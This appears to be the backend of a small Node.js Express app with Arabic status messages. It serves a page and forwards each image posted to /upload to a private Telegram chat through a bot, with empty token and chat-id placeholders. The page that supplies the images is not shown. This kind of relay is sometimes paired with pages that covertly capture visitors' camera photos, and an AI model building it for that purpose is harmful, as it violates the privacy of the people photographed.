const express = require("express");
const fs = require("fs");
const fetch = require("node-fetch");
const FormData = require("form-data");
const path = require("path");

const app = express();

const TOKEN = "";
const CHAT_ID = "";

app.use(express.json({ limit: "10mb" }));

app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "index.html"));
});

app.post("/upload", async (req, res) => {
  const base64Image = req.body.image.split(";base64,").pop();
  fs.writeFileSync("image.png", base64Image, { encoding: "base64" });

  const form = new FormData();
  form.append("chat_id", CHAT_ID);
  form.append("photo", fs.createReadStream("./image.png"));

  await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
    method: "POST",
    body: form
  });

  res.send("✅ تم الإرسال");
});

app.listen(3000, () => {
  console.log("✅ السيرفر يعمل على http://localhost:3000");
});
